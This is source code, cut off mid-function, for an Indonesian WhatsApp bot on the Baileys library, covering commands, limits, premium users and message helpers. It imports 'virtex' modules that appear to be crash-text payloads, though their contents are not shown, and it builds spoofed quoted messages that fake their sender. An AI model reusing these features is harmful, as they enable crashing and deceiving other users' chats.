  const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ResyaaectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const simple = require('./lib/simple.js');
const { virtexp, vipi } = require("./lib/virtex.js"); //memans
const hx = require("hxz-api");
const yo = require("tod-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const { EmojiAPI } = require("emoji-api");
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const FormData = require("form-data");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const got = require("got");
const imageToBase64 = require("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const brainly = require("brainly-scraper");
const yts = require("yt-search");
const ms = require("parse-ms");
const toMs = require("ms");
const imgbb = require("imgbb-uploader");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");
const { color, bgcolor } = require("./lib/color");
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, igdl, upload, formatDate } = require("./lib/ytdl");
const { lirikLagu } = require('./lib/lirik.js')
const { recognize } = require('./lib/ocr')
const { virtex } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { wikiSearch } = require('./lib/wiki.js')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { webp2mp4File } = require("./lib/webp2mp4");
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const afk = JSON.parse(fs.readFileSync("./lib/off.json"));
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js");
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const { addVote, delVote } = require("./lib/vote");
const _limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/uang.json'))
const reminder = require("./lib/reminder")
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
/*SETTINGGGGGGGG*/
banChats = false;
offline = false;
targetpc = "6289626029135";
gopay = "-";
limitawal = "25"
ovo = "-";
pulsa = "0896-2602-9135";
dana = "0896-2602-9135"
namabot = "*Katashi-Bot*";
linkimg = "https://telegra.ph/file/58f6d9179e497062a84b0.jpg";
/*ITU YG DI ATAS LINK IMAGENYA DONASI DANA YA KAWAN*/
grupct = "https://chat.whatsapp.com/H5JPkwbob5YH8x5Mpcxybm";
owner = "6289626029135";
nama_owner = "Putra";
instagram = "k4t4sh1._";
yt = "https://youtube.com/channel/UCrEMv0c1cuploq5GruMuwvw";
fake = "*Katashi-Bot*";
thumb = fs.readFileSync("./stik/thumb.jpeg");
numbernye = "0";
waktu = "-";
alasan = "GadaðŸ—¿";
autojoin = false;
prefixStatus = false;
hit_today = [];

/*Akhir Setting*/

//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));
//Biasalah Storage
const videonye = JSON.parse(fs.readFileSync('./strg/video.json'))
const fiturnye = JSON.parse(fs.readFileSync('./database/video.json'))
const imagenye = JSON.parse(fs.readFileSync('./strg/image.json'))
const audionye = JSON.parse(fs.readFileSync('./strg/audio.json'))
const setiker = JSON.parse(fs.readFileSync('./strg/stik.json'))

     /********** PREMIUM **********/
     const getPremiumExpired = (sender) => {

		    let position = null
		    Object.keys(prem).forEach((i) => {
		        if (prem[i].id === sender) {
		            position = i
		        }
		    })
		    if (position !== null) {
		        return prem[position].expired
		    }
		} 
		
		const expiredCheck = () => {
		    setInterval(() => {
		        let position = null
		        Object.keys(prem).forEach((i) => {
		            if (Date.now() >= prem[i].expired) {
		                position = i
		            }
		        })
		        if (position !== null) {
		            console.log(`Premium expired: ${prem[position].id}`)
		            prem.splice(position, 1)
		            fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
		             }
		    }, 1000)
		} 
		
		const getAllPremiumUser = () => {
		    const array = []
		    Object.keys(prem).forEach((i) => {
		        array.push(prem[i].id)
		    })
		    return array
		}
		
		//
		
		//ATM
const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
            }
        }
        
         const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
            }
        }
		//function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return syaa.sendMessage(from,`Limit request anda sudah habis\n\n_Note : limit bisa di dapatkan dengan cara ${prefix}buylimit dan dengan naik level_`, text,{ quoted: mek})
                            syaa.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
                        syaa.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}
				//funtion limited
           const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    syaa.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/limit.json',JSON.stringify(_limit))
           return false
       }
     }
// Sticker Cmd
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};

const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = syaa = async (syaa, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
    const type = Object.keys(mek.message)[0];
    1;
    var prefixRegEx = /^[!&z?=#.+\/]/gi;
    let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
    let prefix = _chats.match(prefixRegEx) ? prefixRegEx.exec(_chats)[0] : "";
    body =
      type === "conversation" && mek.message.conversation.startsWith(prefix)
        ? mek.message.conversation
        : type == "imageMessage" &&
          mek.message.imageMessage.caption.startsWith(prefix)
        ? mek.message.imageMessage.caption
        : type == "videoMessage" &&
          mek.message.videoMessage.caption.startsWith(prefix)
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" &&
          mek.message.extendedTextMessage.text.startsWith(prefix)
        ? mek.message.extendedTextMessage.text
        : "";
    budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
    let chats = _chats.match(prefixRegEx)
      ? _chats
          .split(prefixRegEx)
          .find((v) => v === _chats.replace(prefixRegEx, ""))
      : _chats;
    let command = chats.split(/ +/g)[0];
    hit_today.push(command);
    const args = _chats.trim().split(/ +/).slice(1);
    const isCmd = _chats.match(prefixRegEx)
      ? prefixRegEx.exec(_chats)["input"]
      : _chats;
    const q = args.join(" ");
    const botNumber = syaa.user.jid;
    const botNumberss = syaa.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");
    //test command
        //akhir
    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;

    const sender = mek.key.fromMe
      ? syaa.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? syaa.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    // const isSelfNumber = config.NomorSELF
    // const isOwner = sender.id === isSelfNumber
    const totalchat = await syaa.chats.all();
    const m = simple.smsg(syaa, mek);
    const groupMetadata = isGroup ? await syaa.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isOwner = ownerNumber.includes(sender)
    const isBanned = ban.includes(sender)
    const isPremium= prem.includes(sender)
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = mek.key.fromMe
      ? syaa.user.jid
      : syaa.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? syaa.user.name
      : conts.notify || conts.vname || conts.name || "-";
    const readmore = "ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ";
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;
    //Y
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let d = new Date();
    let locale = "id";
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
    const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam";
    }
    

    //MESS
    mess = {
      wait: "Sedang Proses nihh, tunggu ya",
      admin: "*[ ADMIN GROUP ONLY ]*",
      prem: "Khusus Member Premm!!!",
      own: "*[OWNER BOT ONLY]*",
      ban: "Kamu Telah Di Ban Oleh Owner, silahkan chat owner untuk minta di unban",
      success: "Successâˆš",
      wrongFormat: "Format salah, Liat kembali di menu",
      error: {
        stick: "Sticker Only",
        Iv: "Link Gak Valid",
      },
      only: {
        group: "*[ GROUP ONLY ]*",
      },
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };

    const reply = (teks) => {
      syaa.sendMessage(from, teks, text, { quoted: mek });
    };

    const sendMess = (hehe, teks) => {
      syaa.sendMessage(hehe, teks, text);
    };
    

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? syaa.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : syaa.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };

    const meki = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289626029135-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: thumb,
          surface: 200,
          message: fake,
          orderTitle: "Putraaa.",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289626029135-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 99999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289626029135-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6289626029135-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289626029135-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      syaa.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      syaa.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./stik/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      syaa.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289626029135-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            syaa.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
            },
            title: "Putra-Fakereply", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "Putraaa",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        syaa.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
    const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      syaa.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButImage = async (
      id,
      text1,
      desc1,
      gam1,
      but = [],
      options = {}
    ) => {
      kma = gam1;
      mhan = await syaa.prepareMessage(from, kma, image);
      const buttonMessages = {
        imageMessage: mhan.message.imageMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 4,
      };
      syaa.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButVideo = async (
      id,
      text1,
      desc1,
      vid1,
      but = [],
      options = {}
    ) => {
      kma = vid1;
      mhan = await syaa.prepareMessage(from, kma, video);
      const buttonMessages = {
        videoMessage: mhan.message.videoMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 5,
      };
      syaa.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
